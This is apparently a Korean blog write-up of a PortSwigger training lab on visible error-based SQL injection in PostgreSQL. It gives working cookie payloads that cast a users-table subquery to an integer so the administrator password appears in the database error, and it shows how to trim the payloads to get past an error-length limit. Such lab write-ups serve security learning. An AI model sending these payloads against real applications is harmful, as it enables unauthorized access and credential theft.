+++
date = '2026-05-21T14:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Visible error-based SQL injection'
summary = "DB 오류 메시지가 응답에 그대로 노출되는 환경에서, 문자열을 정수로 캐스팅해 원하는 데이터를 오류 메시지로 끌어내고 길이 제한을 우회해 비밀번호를 획득하는 풀이 (PostgreSQL)"
toc = true
tags = ["SQL Injection", "PortSwigger", "PRACTITIONER", "Error-Based"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

> ![image.png](/writeup/portswigger/sqli/11/1.png)

Tracking Cookie 값이 SQL 쿼리에 사용되며, 이 지점에 SQL Injection 취약점이 존재한다.  
쿼리 결과 자체는 반환되지 않지만, DB 오류 메시지가 응답에 그대로 노출된다. 이를 이용해 `users` 테이블에서 administrator 계정 정보를 오류 메시지로 끌어내 로그인하면 문제가 해결된다.

### SQL Injection 진단

먼저 쿠키에 `'` 문자를 삽입해 오류 메시지가 노출되는지 확인한다. 응답은 다음과 같다.

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '<tracking-id>''. Expected char
```

오류 메시지가 그대로 반환되어 원본 쿼리 구조(`SELECT * FROM tracking WHERE id = '...'`)를 확인할 수 있으며, 메시지 형식으로 보아 대상 DBMS는 PostgreSQL로 추정된다.

---

## 익스플로잇

먼저 PostgreSQL에서 동작하는 Error-Based 페이로드로 정보 노출이 의도대로 이루어지는지 확인한다. 문자열을 `int` 로 캐스팅하면 변환에 실패하며, 그 원본 문자열이 오류 메시지에 실린다.

```sql
' AND 1=CAST(version() AS int)--
```

응답은 다음과 같이 버전 정보를 노출한다.

```
ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, ..."
```

정보 노출이 확인되었으니 administrator 계정 정보를 노출하는 페이로드를 구성한다.

```sql
' AND 1=CAST((SELECT username || ':' || password FROM users WHERE username='administrator' LIMIT 1) AS int)--
```

그런데 응답을 보면 값이 중간에 잘려 있다. 이 랩은 오류 메시지 길이에 제한이 있어, 페이로드가 길면 원하는 값이 잘려 나온다. 따라서 서브쿼리를 더 짧게 수정한다.

```sql
' AND 1=(SELECT password FROM users LIMIT 1)::int--
```

이 역시 응답이 잘리므로, 페이로드를 더 줄이는 동시에 `TrackingId` 쿠키의 앞부분(원래 값)을 아예 비워 길이 여유를 확보한다.

```sql
' OR 1=(SELECT password FROM users LIMIT 1)::int--
```

위 페이로드를 쿠키에 넣어 전송하면 응답에 비밀번호가 노출된다.

```
ERROR: invalid input syntax for type integer: "nohuxbh28xyke7cjuyrc"
```

획득한 administrator 계정 정보로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/sqli/11/2.png)

---

## 정리

Visible Error-Based SQL Injection은 DB 오류 메시지가 응답에 그대로 노출될 때, 원하는 데이터를 오류 메시지 안으로 끌어내는 기법이다.  
PostgreSQL에서는 문자열을 정수로 캐스팅(`CAST(... AS int)` 또는 `::int`)하면 `invalid input syntax for type integer: "<값>"` 형태로 변환에 실패한 원본 문자열이 오류에 실린다. 다만 이 랩처럼 오류 메시지 길이에 제한이 있으면, 불필요한 연결·조건을 제거하고 `LIMIT` 을 사용하거나 쿠키의 원래 값을 비우는 식으로 페이로드를 최대한 짧게 구성해 값이 잘리지 않도록 해야 한다.  
Blind 계열과 달리 한 번의 요청으로 값을 직접 읽어낼 수 있어 훨씬 효율적이다.